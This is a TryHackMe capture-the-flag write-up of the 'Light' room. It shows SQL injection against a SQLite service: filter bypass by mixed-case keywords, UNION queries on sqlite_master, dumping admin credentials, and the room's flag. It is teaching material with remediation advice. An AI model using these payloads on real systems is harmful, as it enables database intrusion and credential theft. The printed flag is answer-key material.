Here is the English version of the Light writeup:

---

# 💡 Light — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Category](https://img.shields.io/badge/Category-Database%20|%20SQL%20Injection%20|%20SQLite-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** July 2026  
> **Room:** [Light](https://tryhackme.com/room/lightroom)

---

## 📋 Executive Summary

This writeup documents the exploitation of the **Light** room. A SQLite database application accessible via netcat contains an SQL injection vulnerability. The attack chain involves bypassing WAF filters through case randomization, enumerating SQLite version and tables, and extracting admin credentials via UNION-based injection.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| `nc` | Connecting to the database application |
| `nmap` | Port discovery (optional) |

---

## 🔍 Phase 1: Discovery

### Connection

```bash
nc <IP> 1337
```

**Banner:**
```
Welcome to the Light database application!
Enter your username:
```

### Basic Test

```bash
smokey
```

**Result:**
```
Password: vYQ5ngPpw8AdUmL
```

### SQLi Test

Single quote (`'`):

```bash
'
```

**Result:** Syntax error — SQL injection potential confirmed.

---

## 🌐 Phase 2: Filter Analysis & Bypass

### Blocked Characters

| Character | Status |
|-----------|--------|
| `--` | Blocked |
| `/*` | Blocked |
| `%0b` | Blocked |
| `#` | Doesn't work in SQLite (not MySQL comment) |

### Working Payload

```bash
' OR '1'='1
```

**Result:** Password returned — injection confirmed working.

### WAF Bypass (Case Randomization)

Keywords like `SELECT`, `UNION` are blocked. Bypass through mixed case:

```bash
uNion, SeLeCt, sElEcT
```

---

## 🎯 Phase 3: SQLite Enumeration

### Version Detection

```bash
1' uNion SeLeCt sqlite_version() '1
```

**Result:** `3.22.0` — SQLite confirmed.

### Table Listing

```bash
smokey' uNion SeLeCt group_concat(sql) FrOm sqlite_master '1
```

**Result:**
```sql
CREATE TABLE usertable(username TEXT, password TEXT)
CREATE TABLE admintable(username TEXT, password TEXT)
```

**Two tables:** `usertable` and `admintable`

---

## 🏴 Phase 4: Admin Credentials

### Admin Username

```bash
smokey' uNion SeLeCt username FrOm admintable '1
```

**Result:** `TryHackMeAdmin`

### Admin Password

```bash
smokey' uNion SeLeCt password FrOm admintable '1
```

**Result:** `mamZtAuMlrsEy5bp6q17`

---

## 🏁 Phase 5: Flag

### Flag Query

```bash
smokey' uNion SeLeCt password FrOm admintable WhErE username='TryHackMeAdmin' '1
```

**Result:** `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`

---

## 🗺️ Attack Path Visualization

```
[nc <IP> 1337]
    │
    ▼
[smokey → get password]
    │
    ▼
[' → syntax error (SQLi confirmed)]
    │
    ▼
[' OR '1'='1 → bypass]
    │
    ▼
[Case randomization: uNion, SeLeCt]
    │
    ▼
[sqlite_version() → SQLite detection]
    │
    ▼
[sqlite_master → tables: usertable, admintable]
    │
    ▼
[admintable → TryHackMeAdmin : mamZtAuMlrsEy5bp6q17]
    │
    ▼
[Flag: THM{SQLit3_InJ3cTion_is_SimplE_nO?}]
```

---

## 🛡️ Vulnerability Assessment & Remediation

| # | Vulnerability | Severity | Remediation |
|---|--------------|----------|-------------|
| 1 | SQL Injection | 🔴 Critical | Parameterized queries; prepared statements |
| 2 | Case-based WAF bypass | 🟠 High | Keyword normalization; whitelist approach |
| 3 | SQLite master table exposure | 🟡 Medium | Restrict information_schema access |

---

## 🎓 Key Takeaways

1. **Netcat = CLI database** — SQLi is possible without a web interface
2. **SQLite is different** — Use `sqlite_master`, `sqlite_version()` for detection
3. **Case randomization** — Simple but effective WAF bypass technique
4. **Comments may not be needed** — `' OR '1'='1` works without trailing comments

---

## 🚩 Flag

| Flag | Value |
|------|-------|
| **Flag** | `THM{SQLit3_InJ3cTion_is_SimplE_nO?}` |

---

> **⚠️ Legal Disclaimer:** This writeup is for educational and research purposes only. Always obtain explicit written authorization before testing systems you do not own.

---

**Author:** Miraç Akkuş (LatenT)  
**Date:** July 2026
